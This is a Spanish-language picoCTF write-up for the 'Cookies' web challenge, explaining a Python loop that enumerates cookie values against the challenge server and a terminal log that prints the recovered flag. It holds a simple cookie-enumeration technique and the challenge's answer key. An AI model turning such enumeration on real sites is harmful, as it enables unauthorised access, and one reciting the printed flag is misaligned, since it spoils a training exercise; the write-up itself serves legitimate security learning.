## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)

## Pistas
(none)


## Solución
Este script de Python realiza solicitudes HTTP a un servidor web en `http://mercury.picoctf.net:6418/` con diferentes valores de cookies. El objetivo es encontrar una cookie que devuelva una respuesta que contiene la bandera (`picoCTF{...}`). 

1. Se importan las bibliotecas necesarias: `requests` para realizar solicitudes HTTP y `re` para realizar coincidencias de expresiones regulares.
2. Se define la URL del servidor web: `http://mercury.picoctf.net:6418/`.
3. Se itera sobre un rango de 0 a 20 (ambos inclusive) utilizando un bucle `for`.
4. Dentro del bucle, se establece un diccionario de cookies con la clave `'name'` y su valor basado en el índice actual del bucle. Este valor se formatea como una cadena con el valor del índice (`'{}'.format(i)`).
5. Se realiza una solicitud GET al servidor web con las cookies definidas.
6. Se comprueba si la respuesta contiene la cadena `'picoCTF{'` utilizando una instrucción condicional `if`.
7. Si la cadena está presente en la respuesta, se utiliza una expresión regular para encontrar el patrón `'picoCTF{.*}'` en el texto de la respuesta. La bandera encontrada se almacena en la variable `flag`.
8. Se imprime la bandera.

El script encontró la bandera `picoCTF{3v3ry1_l0v3s_c00k135_88acab36}`

picoCTF{3v3ry1_l0v3s_c00k135_88acab36}

```
  If not click the link.arcf99-picoctf@webshell:~$ wget http://mercury.picoctf.net:6418/ -H "Cookie: name=3"7
--2024-03-09 04:13:58--  http://mercury.picoctf.net:6418/
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:6418... connected.
HTTP request sent, awaiting response... 302 FOUND
Location: http://mercury.picoctf.net:6418/ [following]
--2024-03-09 04:13:58--  http://mercury.picoctf.net:6418/
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:6418... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2048 (2.0K) [text/html]
Saving to: 'index.html.1'

index.html.1                                             100%[=================================================================================================================================>]   2.00K  --.-KB/s    in 0s      

2024-03-09 04:13:58 (255 MB/s) - 'index.html.1' saved [2048/2048]

--2024-03-09 04:13:58--  ftp://cookie/%20name=37
           => ' name=37'
Resolving cookie (cookie)... failed: Name or service not known.
wget: unable to resolve host address 'cookie'
FINISHED --2024-03-09 04:13:58--
Total wall clock time: 0.04s
Downloaded: 1 files, 2.0K in 0s (255 MB/s)
arcf99-picoctf@webshell:~$ curl http://mercury.picoctf.net:6418/ -H "Cookie: name=3"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
arcf99-picoctf@webshell:~$ python
Python 3.10.6 (main, Aug 10 2022, 11:40:04) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> import re
>>>     cookies = {'name':'{}'.format(i)}
  File "<stdin>", line 1
    cookies = {'name':'{}'.format(i)}
IndentationError: unexpected indent
>>> import requests
>>> import re
>>> for i in range(21):
...     cookies = {'name':'{}'.format(i)}
...     r = requests.get(url, cookies=cookies)
...     if 'picoCTF{' in r.text:
...             flag = re.findall('picoCTF\{.*\}', r.text)[0]
...             print(flag)
... 
picoCTF{3v3ry1_l0v3s_c00k135_88acab36}
>>> 
>>> 
```


## Notas adicionales

## Referencias